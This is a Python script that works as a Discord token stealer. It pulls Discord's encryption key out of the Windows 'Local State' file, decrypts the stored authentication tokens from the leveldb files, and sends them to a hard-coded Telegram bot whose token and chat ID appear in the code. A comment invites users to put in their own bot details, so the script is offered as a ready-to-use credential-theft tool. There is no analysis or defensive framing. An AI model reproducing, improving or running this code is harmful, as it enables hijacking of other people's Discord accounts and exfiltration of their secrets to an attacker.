import os
import re
import json
import base64
import sqlite3
import shutil
import requests
from pathlib import Path


def get_master_key():
    local_state_path = os.path.join(
        os.getenv('APPDATA'), 'discord', 'Local State'
    )
    
    with open(local_state_path, 'r') as f:
        local_state = json.load(f)
    
    encrypted_key = base64.b64decode(
        local_state['os_crypt']['encrypted_key']
    )[5:]
    
    import ctypes
    import ctypes.wintypes
    
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]
    
    p = ctypes.create_string_buffer(encrypted_key, len(encrypted_key))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    
    ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blobin), None, None, None, None, 0,
        ctypes.byref(blobout)
    )
    
    master_key = ctypes.string_at(blobout.pbData, blobout.cbData)
    return master_key

def decrypt_token(encrypted_value, master_key):
    from Crypto.Cipher import AES
    
    if encrypted_value[:3] != b'v10':
        return None
    
    nonce = encrypted_value[3:15]
    ciphertext = encrypted_value[15:-16]
    tag = encrypted_value[-16:]
    
    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
    
    try:
        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
    except:
        return None

def extract_tokens():
    master_key = get_master_key()
    
    leveldb_path = os.path.join(
        os.getenv('APPDATA'), 'discord', 
        'Local Storage', 'leveldb'
    )
    
    tokens = set()
    
    temp = 'temp_discord_ldb'
    try:
        shutil.copytree(leveldb_path, temp)
        scan = temp
    except:
        scan = leveldb_path
    
    for file in os.listdir(scan):
        if not file.endswith(('.ldb', '.log')):
            continue
        
        with open(os.path.join(scan, file), 'rb') as f:
            content = f.read()
        
        for match in re.finditer(rb'dQw4w9WgXcQ:[^"]*', content):
            try:
                encrypted_b64 = match.group().split(b':')[1]
                encrypted = base64.b64decode(encrypted_b64)
                token = decrypt_token(encrypted, master_key)
                if token:
                    tokens.add(token)
                    print(f'[+] Token: {token[:50]}...')
            except:
                pass
    
    shutil.rmtree(temp, ignore_errors=True)
    return tokens

tokens = extract_tokens()
print(f'\n✅ Found {len(tokens)} real token(s)')
for t in tokens:
    print(t)


# === CHANGE THESE TWO LINES WITH YOUR OWN INFO ===
TELEGRAM_BOT_TOKEN = "8597494924:AAGYXR_tBevozupdV5aOGbyGlaC9wE_ZfUQ"          # Get from @BotFather
TELEGRAM_CHAT_ID   = "1047066800"            # Get from @userinfobot or @getmyid_bot

def send_to_telegram(message: str):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        r = requests.post(url, json=payload, timeout=10)
        if r.status_code == 200:
            print("✅ Token(s) sent to your Telegram bot successfully!")
        else:
            print(f"❌ Failed to send to Telegram. Status: {r.status_code}")
            print(r.text)
    except Exception as e:
        print(f"❌ Error sending to Telegram: {e}")

# Send the found tokens
if tokens:
    msg = "🔥 **New Discord Token(s) Found!**\n\n"
    for i, token in enumerate(tokens, 1):
        msg += f"<b>Token {i}:</b>\n<code>{token}</code>\n\n"
    
    msg += f"✅ Total: {len(tokens)} token(s)\n"
    msg += f"🕒 Time: {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

    send_to_telegram(msg)
else:
    send_to_telegram("No Discord tokens were found on this machine.")
